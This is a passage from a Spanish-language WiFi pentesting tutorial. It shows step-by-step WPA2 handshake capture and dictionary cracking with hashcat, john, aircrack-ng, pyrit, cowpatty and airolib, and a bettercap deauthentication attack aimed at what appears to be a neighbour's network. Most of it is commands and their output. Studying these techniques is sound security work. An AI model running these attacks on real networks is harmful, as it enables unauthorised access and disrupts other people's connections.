Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to miCaptura.hccap

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  miCaptura.hccap
```

Una vez hecho, hacemos uso de **hccap2john** para visualizar el hash:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hccap2john miCaptura.hccap &gt; miHash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #cat !$
cat miHash
hacklab:$WPAPSK$hacklab#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
```

Y eso tan bonito que vemos, es el Hash correspondiente a la contraseña de la red WiFi, la cual podríamos
sencillamente crackear llegados hasta este punto haciendo uso de la herramienta **John** junto a un diccionario.


#### Fuerza bruta con John

Ya habiendo llegado hasta aquí, procedemos con los ataques de fuerza bruta. Aprovechando el punto
anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la contraseña de la red WiFi
haciendo uso de un diccionario a través de la herramienta **John**, de la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #john --show --format=wpapsk miHash 
hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap

1 password hash cracked, 0 left
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo &quot;Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)&quot;
Password: vampress1
```

Y ahí dispondríamos de la contraseña de la red inalámbrica, que en este caso es **vampress1**.

#### Fuerza bruta con Aircrack

Para crackear nuestro Handshake desde la propia suite de **aircrack**, tan sólo tendríamos que emplear esta
sintaxis:

* aircrack-ng -w rutaDiccionario Captura-01.cap

Se iniciaría el proceso de fuerza bruta y una vez obtenida se detendría la fase de cracking, mostrando la
contraseña siempre y cuando esta se encuentre en el diccionario especificado:

```bash
                              Aircrack-ng 1.5.2 

      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) 

      Time left: 20 minutes, 54 seconds                          4.96%

                           KEY FOUND! [ vampress1 ]


      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 

      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 

      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
```

La velocidad de cómputo siempre va a depender de nuestra CPU, pero veremos un par de técnicas más adelante
para aumentar nuestra velocidad de cómputo, superando las 10 millones de contraseñas por segundo.

#### Fuerza bruta con Hashcat

Ya que **aircrack** no es capaz de tirar por GPU, en caso de que tengáis una GPU como en mi caso:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #nvidia-detect 
Detected NVIDIA GPUs:
01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)
```

Lo mejor es tirar de **Hashcat** para estos casos. Para correr la herramienta, primero necesitamos saber cuál
es el método numérico correspondiente a **WPA**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hashcat -h | grep -i wpa
   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
   2501 | WPA-EAPOL-PMK                                    | Network Protocols
  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
  16801 | WPA-PMKID-PMK                                    | Network Protocols
```

Una vez identificado (**2500**), lo primero que necesitamos hacer es convertir nuestra captura '**.cap**' a un
archivo de tipo '**.hccapx**', específico para la combinación de Hashcat. Para ello, corremos el parámetro
'**-j**' de aircrack (esta vez es minúscula):

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng -j hashcatCapture Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to hashcatCapture.hccapx

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  hashcatCapture.hccapx
```

Ya en posesión de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:

* hashcat -m 2500 -d 1 rockyou.txt --force -w 3

Obteniendo los siguientes resultados en un tiempo récord:

```bash
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU

OpenCL Platform #2: The pocl project
====================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921517
* Keyspace..: 14344386

ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA-EAPOL-PBKDF2
Hash.Target......: hacklab (AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38)
Time.Started.....: Sun Aug 11 19:12:43 2019 (4 secs)
Time.Estimated...: Sun Aug 11 19:12:47 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    79177 H/s (7.18ms) @ Accel:128 Loops:64 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 807901/14344386 (5.63%)
Rejected.........: 439261/807901 (54.37%)
Restore.Point....: 728207/14344386 (5.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 22lehvez33 -&gt; rodnesha
Hardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8

```

Recuerda hacer uso del parámetro **-d** para especificar el dispositivo a usar. Si queremos listar la
contraseña una vez crackeada (aunque también la vemos en el output listado anteriormente), podemos hacer lo
siguiente:

```bash
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat --show -m 2500 hashcatCapture.hccapx 
ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
```

En este caso, para los curiosos, haciendo uso de una **GeForce GTX 1050** estaríamos yendo a 79.177 Hashes por
segundo, lo cual hace que en cuestión de segundos nos podamos recorrer todo el rockyou entero.

#### Proceso de ataque con Bettercap

Todo el proceso llevado a cabo hasta ahora, puede ser realizado desde **Bettercap**. Sí que es cierto que
aunque para el caso visto prefiero tirar del método convencional, en ocasiones uso **Bettercap** para los
ataques de PKMID que explicaré más adelante, para redes WPA/WPA2 sin clientes.

Lo primero de todo para llevar a cabo el procedimiento, es poner nuestra tarjeta de red en modo monitor tal y
como se detalló en los puntos anteriormente vistos. Posteriormente, desde **Bettercap**, podemos hacer lo
siguiente:

```bash
┌─[root@parrot]─[/opt/bettercap]
└──╼ #./bettercap -iface wlan0mon
bettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]

 wlan0mon  » wifi.recon on
[21:07:22] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)
[21:07:22] [sys.log] [inf] wifi started (min rssi: -200 dBm)
[21:07:22] [sys.log] [inf] wifi channel hopper started.
 wlan0mon  » [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_49BA (-92 dBm) detected as 84:aa:9c:f1:49:bc (MitraStar Technology Corp.).
 wlan0mon  » [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_2F95 (-93 dBm) detected as e8:d1:1b:21:2f:96 (Askey Computer Corp).
 wlan0mon  » [21:07:22] [wifi.ap.new] wifi access point LowiF7D3 (-84 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).
 wlan0mon  » [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_A908 (-90 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).
 wlan0mon  » [21:07:22] [wifi.ap.new] wifi access point devolo-30d32d583e03 (-96 dBm) detected as 30:d3:2d:58:3e:03 (devolo AG).
 wlan0mon  » [21:07:24] [wifi.ap.new] wifi access point MOVISTAR_1677 (-54 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).
 wlan0mon  » [21:07:24] [wifi.ap.new] wifi access point MIWIFI_psGP (-94 dBm) detected as 50:78:b3:ee:bb:ac.
 wlan0mon  » [21:07:25] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).
 wlan0mon  » [21:07:27] [wifi.ap.new] wifi access point linksys (-73 dBm) detected as 00:12:17:70:d5:2c (Cisco-Linksys, LLC).
 wlan0mon  » [21:07:27] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-82 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).
 wlan0mon  » [21:07:27] [wifi.client.new] new station 78:4f:43:24:01:4e (Apple, Inc.) detected for linksys (00:12:17:70:d5:2c)
 wlan0mon  » [21:07:27] [wifi.ap.new] wifi access point MOVISTAR_3126 (-93 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).
 wlan0mon  » [21:07:27] [wifi.ap.new] wifi access point vodafone4038 (-92 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).
 wlan0mon  » [21:07:27] [wifi.client.new] new station f0:7b:cb:04:d7:37 (Hon Hai Precision Ind. Co.,Ltd.) detected for linksys (00:12:17:70:d5:2c)
```

Es decir, a través del comando **wifi.recon on**, monitorizamos las redes disponibles del entorno, tal y como
lo haríamos desde **airodump**. Una vez hecho, por comodidad, filtramos los resultados por el número de
clientes/estaciones disponibles para los distintos AP's:

```bash
 wlan0mon  » set wifi.show.sort clients desc
 ```

 Por último, a través de la utilidad **ticker**, podemos especificar los comandos que queramos que se ejecuten
 a intervalos regulares de tiempo. En mi caso, especificaré que quiero hacer una limpieza de pantalla seguido
 de la operación **wifi.show**, que se encargará de listarme los puntos de acceso disponibles en el entorno en
base al criterio de filtrado a nivel de clientes que especifiqué en la operación anterior:

```bash
 wlan0mon  » set ticker.commands 'clear; wifi.show'
 wlan0mon  » ticker on
```

Una vez presionemos la tecla 'Enter', obtendremos unos resultados como estos:

```bash
┌─────────┬───────────────────┬─────────────────────┬──────────────────┬──────────────────────┬─────┬───────────┬────────┬───────┬──────────┐
│  RSSI   │       BSSID       │        SSID         │    Encryption    │         WPS          │ Ch  │ Clients ▾ │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼─────────────────────┼──────────────────┼──────────────────────┼─────┼───────────┼────────┼───────┼──────────┤
│ -81 dBm │ 30:d3:2d:58:3c:6b │ devolo-30d32d583c6b │ WPA2 (CCMP, PSK) │ 2.0                  │ 11  │ 1         │ 326 B  │ 84 B  │ 21:15:40 │
│ -69 dBm │ 1c:b0:44:d4:16:85 │ MOVISTAR_PLUS_1677  │ WPA2 (CCMP, PSK) │ 2.0                  │ 112 │ 1         │ 516 B  │ 344 B │ 21:15:31 │
│ -74 dBm │ 00:12:17:70:d5:2c │ linksys             │ OPEN             │                      │ 11  │ 1         │ 383 kB │ 31 kB │ 21:15:40 │
│ -95 dBm │ fc:b4:e6:99:a9:09 │ MOVISTAR_A908       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1   │           │        │       │ 21:15:34 │
│ -87 dBm │ f8:8e:85:df:3e:13 │ Wlan1               │ WPA (TKIP, PSK)  │ 1.0                  │ 9   │           │ 7.1 kB │       │ 21:15:39 │
│ -95 dBm │ e8:d1:1b:21:2f:96 │ MOVISTAR_2F95       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1   │           │        │       │ 21:15:18 │
│ -98 dBm │ d0:17:c2:30:45:7c │ pepephone_ADSLR9C0  │ WPA2 (CCMP, PSK) │                      │ 3   │           │        │       │ 21:15:19 │
│ -95 dBm │ cc:d4:a1:0c:31:28 │ MOVISTAR_3126       │ WPA2 (CCMP, PSK) │ 2.0 (not configured) │ 11  │           │        │       │ 21:15:39 │
│ -97 dBm │ a0:ab:1b:45:ad:4f │ MiFibra-FA4C-EXT    │ WPA2 (TKIP, PSK) │ 2.0                  │ 1   │           │        │       │ 21:15:01 │
│ -90 dBm │ 84:aa:9c:f1:49:bc │ MOVISTAR_49BA       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1   │           │        │       │ 21:15:35 │
│ -93 dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP         │ WPA2 (CCMP, PSK) │ 2.0                  │ 6   │           │        │       │ 21:15:37 │
│ -91 dBm │ 28:9e:fc:0c:40:3e │ vodafone4038        │ WPA2 (TKIP, PSK) │ 2.0                  │ 11  │           │        │       │ 21:15:40 │
│ -54 dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677       │ WPA2 (CCMP, PSK) │ 2.0                  │ 6   │           │ 172 B  │       │ 21:15:37 │
│ -88 dBm │ 10:62:d0:f6:f7:d8 │ LowiF7D3            │ WPA2 (TKIP, PSK) │ 2.0                  │ 1   │           │ 267 B  │       │ 21:15:35 │
│ -69 dBm │ 06:b0:44:d4:16:85 │ MOVISTAR_1677       │ WPA2 (CCMP, PSK) │ 2.0                  │ 112 │           │        │       │ 21:15:31 │
└─────────┴───────────────────┴─────────────────────┴──────────────────┴──────────────────────┴─────┴───────────┴────────┴───────┴──────────┘

wlan0mon (ch. 40) / ↑ 0 B / ↓ 538 kB / 1392 pkts

 wlan0mon  »  
```

Ahora bien, ¿cómo filtro el canal que me interesa?, sencillo... a través de la siguiente operación:

```bash
 wlan0mon  » wifi.recon.channel 6
```

Esto hará que ahora se nos listen las redes disponibles en el canal 6:

```bash
┌─────────┬───────────────────┬───────────────┬──────────────────┬─────┬────┬───────────┬────────┬───────┬──────────┐
│  RSSI   │       BSSID       │     SSID      │    Encryption    │ WPS │ Ch │ Clients ▾ │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼───────────────┼──────────────────┼─────┼────┼───────────┼────────┼───────┼──────────┤
│ -94 dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP   │ WPA2 (CCMP, PSK) │ 2.0 │ 6  │           │        │       │ 21:18:09 │
│ -53 dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677 │ WPA2 (CCMP, PSK) │ 2.0 │ 6  │           │ 3.4 kB │       │ 21:18:10 │
└─────────┴───────────────────┴───────────────┴──────────────────┴─────┴────┴───────────┴────────┴───────┴──────────┘

wlan0mon (ch. 6) / ↑ 0 B / ↓ 906 kB / 2889 pkts

 wlan0mon  » wifi.recon.channel 6
```

¿Qué es lo cómodo de este método?, pues que por ejemplo yo ahora viendo que la red **MOVISTAR_1677** tiene el
BSSID **1c:b0:44:d4:16:78**, podría hacer un ataque de de-autenticación sobre los clientes que **Bettercap**
detecte en dicha red:

```bash
 wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
```

Obteniendo los siguientes resultados:

```bash
 wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
 wlan0mon  » [21:33:26] [sys.log] [inf] wifi deauthing client 20:34:fb:b1:c5:53 from AP MOVISTAR_1677 (channel:6 encryption:WPA2)
 ```

 Una vez el cliente se reconecte a la red:

 ```bash
 wlan0mon  » [21:33:13] [wifi.client.probe] station da:a1:19:8b:d9:82 (Google, Inc.) is probing for SSID MOVISTAR_DF12 (-38 dBm)
 wlan0mon  » [21:33:15] [wifi.client.probe] station 20:34:fb:b1:c5:53 is probing for SSID MOVISTAR_1677 (-40 dBm)
 wlan0mon  » [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) WPA2 handshake to /root/bettercap-wifi-handshakes.pcap
 ```

 Se genera el Handshake y este es exportado automáticamente al fichero indicado desde el verbose de la
 herramienta. Si analizamos con **pyrit**, vemos que efectivamente... se ha capturado un Handshake por parte
 de dicha estación:

 ```bash
 ┌─[root@parrot]─[/opt/bettercap]
└──╼ #pyrit -r /root/bettercap-wifi-handshakes.pcap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file '/root/bettercap-wifi-handshakes.pcap' (1/1)...
Parsed 7 packets (7 802.11-packets), got 1 AP(s)

#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
  #1: Station 20:34:fb:b1:c5:53, 4 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
    #2: HMAC_SHA1_AES, good, spread 1
    #3: HMAC_SHA1_AES, good, spread 2
    #4: HMAC_SHA1_AES, good, spread 2
```

### Técnicas de aumento de la velocidad de cómputo

Si bien es cierto que considero que la velocidad de cómputo de mi ordenador es bastante aceptable
(7.000/10.000 contraseñas por segundo), ¿hay alguna forma de ir más rápido aún?, ¿hay alguna forma de
multiplicar por 1.000 la velocidad si ser necesario un ordenador de altos requisitos?, la respuesta es si.

A la hora de iniciar el proceso de fuerza bruta con **aircrack**, por ejemplo, estamos llevando a cabo varios pasos:

* Filtrado de la captura para extraer el Hash (Handshake)
* Lectura de diccionario (CCMP por cada contraseña en texto claro)
* Comparativa del Hash resultante con el Handshake capturado
* True/False (Si hay Match, es que esa es la contraseña)

¿No has pensado en que todos estos pasos se podrían omitir, si contásemos con un diccionario de claves ya
precomputadas?. Me explico, ¿y si en vez de tener un diccionario de contraseñas en texto claro, tenemos un
diccionario de contraseñas ya pre-computadas con sus respectivos hashes?, fijaros que ahora sería simplemente
hacer los siguientes pasos:

* Lectura de la clave PMK del diccionario
* True/False (Match con el Handshake)

Esta reducción de pasos es equivalente a la velocidad del tiempo de cómputo, es decir, es mucho menor. Lo
iremos viendo poco a poco, pero primero un poco de cultura :)

#### Concepto de Rainbow Table

Hoy las contraseñas ya no se guardan sin cifrar –o eso se espera. Cuando los usuarios de una plataforma fijan
una clave de acceso para su cuenta, esta secuencia de caracteres no aparece en texto plano en una base de
datos en algún servidor, puesto que no sería seguro: si encontrara la forma de entrar en ella, un hacker lo
tendría muy fácil para acceder a todas las cuentas de un determinado usuario.

Para el eCommerce, la banca en línea o los servicios gubernamentales online esto tendría consecuencias
fatales. En lugar de ello, los servicios online utilizan diversos mecanismos criptográficos para cifrar las
contraseñas de sus usuarios de modo que en las bases de datos solo aparezca un valor hash (valor resumen) de
la clave.

Incluso conociendo la función criptográfica que lo ha originado, desde este valor hash no es posible deducir
la contraseña, porque no es posible reconstruir el procedimiento a la inversa. Esto lleva a los
ciberdelincuentes a recurrir a los ataques de fuerza bruta, en los cuales un programa informático intenta
“adivinar” la secuencia correcta de caracteres que constituye la contraseña durante tanto tiempo como haga
falta.

Este método puede combinarse con los llamados “diccionarios” de contraseñas. En estos archivos, que circulan
libremente en Internet, pueden encontrarse numerosas contraseñas que bien son muy populares o ya fueron
interceptadas en el pasado. 

Los hackers tienden a probar primero todas las contraseñas del diccionario, lo que les permite ahorrar tiempo,
aunque, en función de la complejidad de las contraseñas (longitud y tipo de caracteres), este proceso puede
resultar más largo y consumir más recursos de lo esperado.

También disponibles en la Red y también un recurso para descifrar claves secretas, las tablas rainbow van un
paso más allá de los diccionarios. Estos ficheros, que pueden llegar a tener un tamaño de varios cientos de
gigabytes, contienen un listado de claves junto con sus valores hash, pero de forma incompleta: para reducir
su tamaño y así su necesidad de espacio en memoria, se crean cadenas de valores a partir de las cuales pueden
reconstruirse fácilmente los demás valores. Con estas tablas los valores hash encontrados en un banco de datos
pueden ordenarse con sus claves en texto plano.

Un ejemplo claro: https://hashkiller.co.uk/

#### Cracking con Pyrit

Dicho esto y aunque todavía no vamos a meternos del todo con las **Rainbow Tables**, empecemos viendo cómo
podemos hacer uso de **Pyrit** para crackear contraseñas a través de ataques por diccionario. Primero veremos
el método convencional y más tarde lo combinaremos con una Rainbow Table.

Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la contraseña de la red inalámbrica,
de la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
```

El modo **attack_passthrough** lo que se encarga es de atacar a un handshake capturado por medio de un ataque
de fuerza bruta, usando el diccionario especificado a través del parámetro '**-r**'.

Una vez obtenida la contraseña:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 40002 PMKs so far; 2466 PMKs per second. 123hello9

The password is 'hottie4u'.
```

Si nos fijamos... **2.466 PMKs por segundo**, lo cual es bastante triste considerando la velocidad de
**aircrack**, pero no nos preocupemos, a pesar de que ahora estamos decepcionados, más adelante nos
sorprenderá.

#### Cracking con Cowpatty

El uso de **Cowpatty** para emplear un ataque de fuerza bruta es el siguiente:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #cowpatty -f diccionario -r Captura-01.cap -s hacklab
cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel

The PSK is &quot;hottie4u&quot;.

15242 passphrases tested in 24.02 seconds:  634.53 passphrases/second
```

Importante destacar que siempre hay que especificar el **ESSID** de la red. Como vemos, obtenemos la
contraseña pero el cómputo es incluso mucho menor... **634 contraseñas por segundo**, lo mejoraremos.

#### Cracking con Airolib

Ahora, es cuando vamos a ir aumentando la velocidad de cómputo. **Airolib** nos permite crear un diccionario
de claves pre-computadas (PMK's), lo cual es una maravilla para el caso.

Comenzaremos creando un fichero **passwords-airolib**, indicando el diccionario de contraseñas a usar:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airolib-ng passwords-airolib --import passwd diccionario 
Database &lt;passwords-airolib&gt; does not already exist, creating it...
Database &lt;passwords-airolib&gt; successfully created
Reading file...
Writing...s read, 45922 invalid lines ignored.
Done.
```

Una vez hecho, creamos un fichero que almacene el **ESSID** de nuestra red y lo sincronizamos con el archivo
creado:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo &quot;hacklab&quot; &gt; essid.lst
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airolib-ng passwords-airolib --import essid essid.lst 
Reading file...
Writing...
Done.
```

A través del parámetro '**--stats**', podemos comprobar que está todo correctamente definido:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airolib-ng passwords-airolib --stats
There are 1 ESSIDs and 24078 passwords in the database. 0 out of 24078 possible combinations have been computed (0%).

ESSID	Priority	Done
hacklab	64	0.0
```

Ya que **airolib** trae un parámetro para limpiar el archivo (líneas no legibles o errores), lo usamos también:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airolib-ng passwords-airolib --clean all
Deleting invalid ESSIDs and passwords...
Deleting unreferenced PMKs...
Analysing index structure...
Vacuum-cleaning the database. This could take a while...
Checking database integrity...
integrity_check
ok

Done.
```

Y ya por último, hacemos uso del parámetro **--batch** para generar el diccionario final de claves precomputadas:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airolib-ng passwords-airolib --batch
Batch processing ...
Computed 5000 PMK in 13 seconds (384 PMK/s, 19078 in buffer)
Computed 10000 PMK in 24 seconds (416 PMK/s, 14078 in buffer)
Computed 15000 PMK in 36 seconds (416 PMK/s, 9078 in buffer)
Computed 20000 PMK in 48 seconds (416 PMK/s, 4078 in buffer)
Computed 24078 PMK in 58 seconds (415 PMK/s, 0 in buffer)
All ESSID processed.
```

Una vez generado, atentos a la velocidad. Vamos a ver con **aircrack** cuánto tardamos haciendo uso del
procedimiento tradicional:

```bash
                             Aircrack-ng 1.5.2 

      [00:00:02] 22832/24078 keys tested (9415.01 k/s) 

      Time left: 0 seconds                                      94.83%

                           KEY FOUND! [ hottie4u ]


